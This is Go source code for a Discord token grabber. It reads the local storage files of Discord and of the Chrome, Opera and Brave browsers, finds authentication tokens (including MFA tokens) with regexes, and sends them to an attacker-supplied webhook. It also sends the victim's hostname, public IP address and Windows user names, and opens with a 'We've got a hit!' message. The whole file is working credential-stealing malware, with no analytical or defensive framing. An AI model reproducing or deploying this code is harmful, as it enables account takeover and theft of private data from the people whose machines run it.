package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func sendWebhook(message string) {

	url := "" // Here the webhook
	values := map[string]string{
		"content": message,
	}
	jsonData, err := json.Marshal(values)
	if err != nil {
		return
	}
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}

	var res map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&res)

}

func getTokens() {

	ROAMING := os.Getenv("APPDATA")
	LOCAL := os.Getenv("LOCALAPPDATA")
	PATHS := map[string]string{
		"Discord":        ROAMING + "\\Discord",
		"Discord Canary": ROAMING + "\\discordcanary",
		"Discord PTB":    ROAMING + "\\discordptb",
		"Google Chrome":  LOCAL + "\\Google\\Chrome\\User Data\\Default",
		"Opera":          ROAMING + "\\Opera Software\\Opera Stable",
		"Brave":          LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	}

	for _, path := range PATHS {
		if _, err := os.Stat(path); err == nil {
			path += "\\Local Storage\\leveldb\\"
			files, err := ioutil.ReadDir(path)
			if err != nil {
				continue
			}
			for _, file := range files {
				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
					data, err := ioutil.ReadFile(path + file.Name())
					if err != nil {
						fmt.Println(err)
						continue
					}
					reNotmfa, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
					if err == nil {
						if string(reNotmfa.Find(data)) != "" {
							sendWebhook("Token found : ``" + string(reNotmfa.Find(data)) + "``")
						}
					}
					reMfa, err := regexp.Compile(`mfa\.[\w-]{84}`)
					if err == nil {
						if string(reMfa.Find(data)) != "" {
							sendWebhook("Token found : ``" + string(reMfa.Find(data)) + "``")
						}
					}
				}
			}
		} else {
			continue
		}
	}
}

func getHostname() {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	sendWebhook(hostname)
}

func getIp() {

	resp, err := http.Get("https://ipv4.wtfismyip.com/text")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	ipaddr := string(body)

	if err != nil {
		log.Fatal(err)
	}

	sendWebhook("From IP: ``" + ipaddr + "``")

}

func getUsers() {
	files, err := ioutil.ReadDir("C:/Users")
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.Name() != "All Users" && f.Name() != "desktop.ini" && f.Name() != "Public" && f.Name() != "Default User" && f.Name() != "Default" {
			sendWebhook(f.Name())
		}
	}
}

func main() {
	sendWebhook("**We've got a hit!**")
	getHostname()
	getIp()
	getTokens()
	sendWebhook("-- Windows Users in PC")
	getUsers()

}
